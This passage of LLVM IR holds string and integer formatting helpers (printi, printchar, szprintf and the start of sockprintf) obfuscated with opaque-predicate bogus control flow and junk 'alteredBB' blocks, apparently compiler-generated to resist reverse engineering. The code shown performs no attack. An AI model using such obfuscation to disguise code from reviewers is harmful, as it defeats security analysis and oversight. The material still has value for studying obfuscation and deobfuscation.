  br i1 %36, label %37, label %43

; <label>:37:                                     ; preds = %33
  %38 = load i32, i32* %19, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %19, align 4
  br label %40

; <label>:40:                                     ; preds = %37
  %41 = load i8*, i8** %20, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %20, align 8
  br label %33

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %19, align 4
  %45 = load i32, i32* %15, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.27
  %49 = load i32, i32* @y.28
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  store i32 0, i32* %15, align 4
  %56 = load i32, i32* @x.27
  %57 = load i32, i32* @y.28
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %68

; <label>:64:                                     ; preds = %43
  %65 = load i32, i32* %19, align 4
  %66 = load i32, i32* %15, align 4
  %67 = sub nsw i32 %66, %65
  store i32 %67, i32* %15, align 4
  br label %68

; <label>:68:                                     ; preds = %64, %originalBBpart24
  %69 = load i32, i32* @x.27
  %70 = load i32, i32* @y.28
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i32, i32* %16, align 4
  %78 = and i32 %77, 2
  %79 = icmp ne i32 %78, 0
  %80 = load i32, i32* @x.27
  %81 = load i32, i32* @y.28
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart220, label %originalBB6alteredBB

originalBBpart220:                                ; preds = %originalBB6
  br i1 %79, label %88, label %105

; <label>:88:                                     ; preds = %originalBBpart220
  %89 = load i32, i32* @x.27
  %90 = load i32, i32* @y.28
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %88
  store i32 48, i32* %18, align 4
  %97 = load i32, i32* @x.27
  %98 = load i32, i32* @y.28
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %105

; <label>:105:                                    ; preds = %originalBBpart224, %originalBBpart220
  %106 = load i32, i32* @x.27
  %107 = load i32, i32* @y.28
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %105
  %114 = load i32, i32* @x.27
  %115 = load i32, i32* @y.28
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %122

; <label>:122:                                    ; preds = %originalBBpart228, %originalBBpart2
  %123 = load i32, i32* @x.27
  %124 = load i32, i32* @y.28
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %122
  %131 = load i32, i32* %16, align 4
  %132 = and i32 %131, 1
  %133 = icmp ne i32 %132, 0
  %134 = load i32, i32* @x.27
  %135 = load i32, i32* @y.28
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart242, label %originalBB30alteredBB

originalBBpart242:                                ; preds = %originalBB30
  br i1 %133, label %219, label %142

; <label>:142:                                    ; preds = %originalBBpart242
  %143 = load i32, i32* @x.27
  %144 = load i32, i32* @y.28
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %142
  %151 = load i32, i32* @x.27
  %152 = load i32, i32* @y.28
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %159

; <label>:159:                                    ; preds = %originalBBpart255, %originalBBpart246
  %160 = load i32, i32* @x.27
  %161 = load i32, i32* @y.28
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %159
  %168 = load i32, i32* %15, align 4
  %169 = icmp sgt i32 %168, 0
  %170 = load i32, i32* @x.27
  %171 = load i32, i32* @y.28
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %169, label %178, label %202

; <label>:178:                                    ; preds = %originalBBpart250
  %179 = load i8**, i8*** %13, align 8
  %180 = load i32, i32* %18, align 4
  call void @printchar(i8** %179, i32 %180)
  %181 = load i32, i32* %17, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %17, align 4
  br label %183

; <label>:183:                                    ; preds = %178
  %184 = load i32, i32* @x.27
  %185 = load i32, i32* @y.28
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %183
  %192 = load i32, i32* %15, align 4
  %193 = add nsw i32 %192, -1
  store i32 %193, i32* %15, align 4
  %194 = load i32, i32* @x.27
  %195 = load i32, i32* @y.28
  %196 = sub i32 %194, 1
  %197 = mul i32 %194, %196
  %198 = urem i32 %197, 2
  %199 = icmp eq i32 %198, 0
  %200 = icmp slt i32 %195, 10
  %201 = or i1 %199, %200
  br i1 %201, label %originalBBpart255, label %originalBB52alteredBB

originalBBpart255:                                ; preds = %originalBB52
  br label %159

; <label>:202:                                    ; preds = %originalBBpart250
  %203 = load i32, i32* @x.27
  %204 = load i32, i32* @y.28
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %202
  %211 = load i32, i32* @x.27
  %212 = load i32, i32* @y.28
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %219

; <label>:219:                                    ; preds = %originalBBpart259, %originalBBpart242
  br label %220

; <label>:220:                                    ; preds = %231, %219
  %221 = load i8*, i8** %14, align 8
  %222 = load i8, i8* %221, align 1
  %223 = icmp ne i8 %222, 0
  br i1 %223, label %224, label %234

; <label>:224:                                    ; preds = %220
  %225 = load i8**, i8*** %13, align 8
  %226 = load i8*, i8** %14, align 8
  %227 = load i8, i8* %226, align 1
  %228 = zext i8 %227 to i32
  call void @printchar(i8** %225, i32 %228)
  %229 = load i32, i32* %17, align 4
  %230 = add nsw i32 %229, 1
  store i32 %230, i32* %17, align 4
  br label %231

; <label>:231:                                    ; preds = %224
  %232 = load i8*, i8** %14, align 8
  %233 = getelementptr inbounds i8, i8* %232, i32 1
  store i8* %233, i8** %14, align 8
  br label %220

; <label>:234:                                    ; preds = %220
  %235 = load i32, i32* @x.27
  %236 = load i32, i32* @y.28
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %234
  %243 = load i32, i32* @x.27
  %244 = load i32, i32* @y.28
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %251

; <label>:251:                                    ; preds = %275, %originalBBpart263
  %252 = load i32, i32* @x.27
  %253 = load i32, i32* @y.28
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %251
  %260 = load i32, i32* %15, align 4
  %261 = icmp sgt i32 %260, 0
  %262 = load i32, i32* @x.27
  %263 = load i32, i32* @y.28
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %261, label %270, label %278

; <label>:270:                                    ; preds = %originalBBpart267
  %271 = load i8**, i8*** %13, align 8
  %272 = load i32, i32* %18, align 4
  call void @printchar(i8** %271, i32 %272)
  %273 = load i32, i32* %17, align 4
  %274 = add nsw i32 %273, 1
  store i32 %274, i32* %17, align 4
  br label %275

; <label>:275:                                    ; preds = %270
  %276 = load i32, i32* %15, align 4
  %277 = add nsw i32 %276, -1
  store i32 %277, i32* %15, align 4
  br label %251

; <label>:278:                                    ; preds = %originalBBpart267
  %279 = load i32, i32* %17, align 4
  ret i32 %279

originalBBalteredBB:                              ; preds = %originalBB, %4
  %280 = alloca i8**, align 8
  %281 = alloca i8*, align 8
  %282 = alloca i32, align 4
  %283 = alloca i32, align 4
  %284 = alloca i32, align 4
  %285 = alloca i32, align 4
  %286 = alloca i32, align 4
  %287 = alloca i8*, align 8
  store i8** %0, i8*** %280, align 8
  store i8* %1, i8** %281, align 8
  store i32 %2, i32* %282, align 4
  store i32 %3, i32* %283, align 4
  store i32 0, i32* %284, align 4
  store i32 32, i32* %285, align 4
  %288 = load i32, i32* %282, align 4
  %289 = icmp sgt i32 %288, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  store i32 0, i32* %15, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %290 = load i32, i32* %16, align 4
  %_ = sub i32 0, %290
  %gen = add i32 %_, 2
  %_7 = shl i32 %290, 2
  %_8 = sub i32 %290, 2
  %gen9 = mul i32 %_8, 2
  %_10 = sub i32 %290, 2
  %gen11 = mul i32 %_10, 2
  %_12 = sub i32 0, %290
  %gen13 = add i32 %_12, 2
  %_14 = sub i32 0, %290
  %gen15 = add i32 %_14, 2
  %_16 = shl i32 %290, 2
  %_17 = sub i32 %290, 2
  %gen18 = mul i32 %_17, 2
  %291 = and i32 %290, 2
  %292 = icmp ne i32 %291, 0
  br label %originalBB6

originalBB22alteredBB:                            ; preds = %originalBB22, %88
  store i32 48, i32* %18, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %105
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %122
  %293 = load i32, i32* %16, align 4
  %_31 = sub i32 0, %293
  %gen32 = add i32 %_31, 1
  %_33 = sub i32 0, %293
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 %293, 1
  %gen36 = mul i32 %_35, 1
  %_37 = sub i32 0, %293
  %gen38 = add i32 %_37, 1
  %_39 = sub i32 0, %293
  %gen40 = add i32 %_39, 1
  %294 = and i32 %293, 1
  %295 = icmp ne i32 %294, 0
  br label %originalBB30

originalBB44alteredBB:                            ; preds = %originalBB44, %142
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %159
  %296 = load i32, i32* %15, align 4
  %297 = icmp sgt i32 %296, 0
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %183
  %298 = load i32, i32* %15, align 4
  %_53 = shl i32 %298, -1
  %299 = add nsw i32 %298, -1
  store i32 %299, i32* %15, align 4
  br label %originalBB52

originalBB57alteredBB:                            ; preds = %originalBB57, %202
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %234
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %251
  %300 = load i32, i32* %15, align 4
  %301 = icmp sgt i32 %300, 0
  br label %originalBB65
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %150

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %142

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* @x.29
  %79 = load i32, i32* @y.30
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %77
  %86 = load i32, i32* %13, align 4
  %87 = icmp ne i32 %86, 0
  %88 = load i32, i32* @x.29
  %89 = load i32, i32* @y.30
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %87, label %96, label %138

; <label>:96:                                     ; preds = %originalBBpart2
  %97 = load i32, i32* @x.29
  %98 = load i32, i32* @y.30
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %96
  %105 = load i32, i32* %14, align 4
  %106 = and i32 %105, 2
  %107 = icmp ne i32 %106, 0
  %108 = load i32, i32* @x.29
  %109 = load i32, i32* @y.30
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart213, label %originalBB1alteredBB

originalBBpart213:                                ; preds = %originalBB1
  br i1 %107, label %116, label %138

; <label>:116:                                    ; preds = %originalBBpart213
  %117 = load i32, i32* @x.29
  %118 = load i32, i32* @y.30
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %116
  %125 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %125, i32 45)
  %126 = load i32, i32* %20, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %20, align 4
  %128 = load i32, i32* %13, align 4
  %129 = add nsw i32 %128, -1
  store i32 %129, i32* %13, align 4
  %130 = load i32, i32* @x.29
  %131 = load i32, i32* @y.30
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart231, label %originalBB15alteredBB

originalBBpart231:                                ; preds = %originalBB15
  br label %141

; <label>:138:                                    ; preds = %originalBBpart213, %originalBBpart2
  %139 = load i8*, i8** %17, align 8
  %140 = getelementptr inbounds i8, i8* %139, i32 -1
  store i8* %140, i8** %17, align 8
  store i8 45, i8* %140, align 1
  br label %141

; <label>:141:                                    ; preds = %138, %originalBBpart231
  br label %142

; <label>:142:                                    ; preds = %141, %74
  %143 = load i32, i32* %20, align 4
  %144 = load i8**, i8*** %9, align 8
  %145 = load i8*, i8** %17, align 8
  %146 = load i32, i32* %13, align 4
  %147 = load i32, i32* %14, align 4
  %148 = call i32 @prints(i8** %144, i8* %145, i32 %146, i32 %147)
  %149 = add nsw i32 %143, %148
  store i32 %149, i32* %8, align 4
  br label %150

; <label>:150:                                    ; preds = %142, %25
  %151 = load i32, i32* %8, align 4
  ret i32 %151

originalBBalteredBB:                              ; preds = %originalBB, %77
  %152 = load i32, i32* %13, align 4
  %153 = icmp ne i32 %152, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %96
  %154 = load i32, i32* %14, align 4
  %_ = shl i32 %154, 2
  %_2 = sub i32 %154, 2
  %gen = mul i32 %_2, 2
  %_3 = sub i32 0, %154
  %gen4 = add i32 %_3, 2
  %_5 = sub i32 %154, 2
  %gen6 = mul i32 %_5, 2
  %_7 = sub i32 0, %154
  %gen8 = add i32 %_7, 2
  %_9 = sub i32 0, %154
  %gen10 = add i32 %_9, 2
  %_11 = shl i32 %154, 2
  %155 = and i32 %154, 2
  %156 = icmp ne i32 %155, 0
  br label %originalBB1

originalBB15alteredBB:                            ; preds = %originalBB15, %116
  %157 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %157, i32 45)
  %158 = load i32, i32* %20, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %20, align 4
  %160 = load i32, i32* %13, align 4
  %_16 = sub i32 0, %160
  %gen17 = add i32 %_16, -1
  %_18 = sub i32 0, %160
  %gen19 = add i32 %_18, -1
  %_20 = sub i32 0, %160
  %gen21 = add i32 %_20, -1
  %_22 = shl i32 %160, -1
  %_23 = sub i32 %160, -1
  %gen24 = mul i32 %_23, -1
  %_25 = sub i32 0, %160
  %gen26 = add i32 %_25, -1
  %_27 = shl i32 %160, -1
  %_28 = sub i32 %160, -1
  %gen29 = mul i32 %_28, -1
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %13, align 4
  br label %originalBB15
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %31

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* @x.31
  %9 = load i32, i32* @y.32
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load i8**, i8*** %3, align 8
  %19 = load i8*, i8** %18, align 8
  store i8 %17, i8* %19, align 1
  %20 = load i8**, i8*** %3, align 8
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %20, align 8
  %23 = load i32, i32* @x.31
  %24 = load i32, i32* @y.32
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %50

; <label>:31:                                     ; preds = %2
  %32 = load i32, i32* @x.31
  %33 = load i32, i32* @y.32
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = bitcast i32* %4 to i8*
  %41 = call i64 @write(i32 1, i8* %40, i64 1)
  %42 = load i32, i32* @x.31
  %43 = load i32, i32* @y.32
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %originalBBpart2
  %51 = load i32, i32* @x.31
  %52 = load i32, i32* @y.32
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %50
  %59 = load i32, i32* @x.31
  %60 = load i32, i32* @y.32
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %67 = load i32, i32* %4, align 4
  %68 = trunc i32 %67 to i8
  %69 = load i8**, i8*** %3, align 8
  %70 = load i8*, i8** %69, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i8**, i8*** %3, align 8
  %72 = load i8*, i8** %71, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %71, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %74 = bitcast i32* %4 to i8*
  %75 = call i64 @write(i32 1, i8* %74, i64 1)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %50
  br label %originalBB6
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

declare i64 @write(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #5
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
